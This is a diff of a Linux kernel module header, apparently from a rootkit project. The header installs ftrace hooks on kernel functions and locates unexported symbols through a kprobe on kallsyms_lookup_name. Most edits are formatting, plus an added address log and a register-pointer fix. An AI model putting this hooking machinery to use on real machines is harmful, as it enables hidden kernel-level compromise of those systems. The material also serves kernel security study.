@@ -10,33 +10,32 @@
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
 /*
- * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
+ * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
  * so we have to use kprobes to get the address.
  * Full credit to @f0lg0 for the idea.
  */
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
 static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
-};
+    .symbol_name = "kallsyms_lookup_name"};
 #endif
 
-#define HOOK(_name, _hook, _orig)   \
-{                   \
-    .name = (_name),        \
-    .function = (_hook),        \
-    .original = (_orig),        \
-}
+#define HOOK(_name, _hook, _orig) \
+    {                             \
+        .name = (_name),          \
+        .function = (_hook),      \
+        .original = (_orig),      \
+    }
 
 /* We need to prevent recursive loops when hooking, otherwise the kernel will
  * panic and hang. The options are to either detect recursion by looking at
- * the function return address, or by jumping over the ftrace call. We use the 
+ * the function return address, or by jumping over the ftrace call. We use the
  * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
  * setting it to 1. (Oridinarily ftrace provides it's own protections against
  * recursion, but it relies on saving return registers in $rip. We will likely
@@ -52,7 +51,8 @@ static struct kprobe kp = {
  * into this struct. This makes is easier for setting up the hook and just passing
  * the entire struct off to fh_install_hook() later on.
  * */
-struct ftrace_hook {
+struct ftrace_hook
+{
     const char *name;
     void *function;
     void *original;
@@ -62,7 +62,7 @@ struct ftrace_hook {
 };
 
 /* Ftrace needs to know the address of the original function that we
- * are going to hook. As before, we just use kallsyms_lookup_name() 
+ * are going to hook. As before, we just use kallsyms_lookup_name()
  * to find the address in kernel memory.
  * */
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
@@ -71,7 +71,7 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
     register_kprobe(&kp);
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
     unregister_kprobe(&kp);
 #endif
     hook->address = kallsyms_lookup_name(hook->name);
@@ -81,11 +81,15 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
         printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
         return -ENOENT;
     }
+    else
+    {
+        printk("rootkit: %s at %lx", hook->name, hook->address);
+    }
 
 #if USE_FENTRY_OFFSET
-    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
 #else
-    *((unsigned long*) hook->original) = hook->address;
+    *((unsigned long *)hook->original) = hook->address;
 #endif
 
     return 0;
@@ -93,21 +97,21 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 
 /* See comment below within fh_install_hook() */
 static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
-{   
+{
     struct pt_regs *p_regs;
     p_regs = ftrace_get_regs(regs);
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
 #if USE_FENTRY_OFFSET
-    regs->ip = (unsigned long) hook->function;
+    p_regs->ip = (unsigned long)hook->function;
 #else
-    if(!within_module(parent_ip, THIS_MODULE))
-        p_regs->ip = (unsigned long) hook->function;
+    if (!within_module(parent_ip, THIS_MODULE))
+        p_regs->ip = (unsigned long)hook->function;
 #endif
 }
 
-/* Assuming we've already set hook->name, hook->function and hook->original, we 
- * can go ahead and install the hook with ftrace. This is done by setting the 
+/* Assuming we've already set hook->name, hook->function and hook->original, we
+ * can go ahead and install the hook with ftrace. This is done by setting the
  * ops field of hook (see the comment below for more details), and then using
  * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
  * provided by ftrace.h
@@ -116,7 +120,7 @@ int fh_install_hook(struct ftrace_hook *hook)
 {
     int err;
     err = fh_resolve_hook_address(hook);
-    if(err)
+    if (err)
         return err;
 
     /* For many of function hooks (especially non-trivial ones), the $rip
@@ -127,19 +131,17 @@ int fh_install_hook(struct ftrace_hook *hook)
      * we're modifying $rip. This is why we have to implement our own checks
      * (see USE_FENTRY_OFFSET). */
     hook->ops.func = fh_ftrace_thunk;
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
-            | FTRACE_OPS_FL_RECURSION
-            | FTRACE_OPS_FL_IPMODIFY;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
-    if(err)
+    if (err)
     {
         printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
         return err;
     }
 
     err = register_ftrace_function(&hook->ops);
-    if(err)
+    if (err)
     {
         printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
         return err;
@@ -156,13 +158,13 @@ void fh_remove_hook(struct ftrace_hook *hook)
 {
     int err;
     err = unregister_ftrace_function(&hook->ops);
-    if(err)
+    if (err)
     {
         printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
     }
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if(err)
+    if (err)
     {
         printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
     }
@@ -176,10 +178,10 @@ int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
     int err;
     size_t i;
 
-    for (i = 0 ; i < count ; i++)
+    for (i = 0; i < count; i++)
     {
         err = fh_install_hook(&hooks[i]);
-        if(err)
+        if (err)
             goto error;
     }
     return 0;
@@ -196,6 +198,6 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 {
     size_t i;
 
-    for (i = 0 ; i < count ; i++)
+    for (i = 0; i < count; i++)
         fh_remove_hook(&hooks[i]);
 }
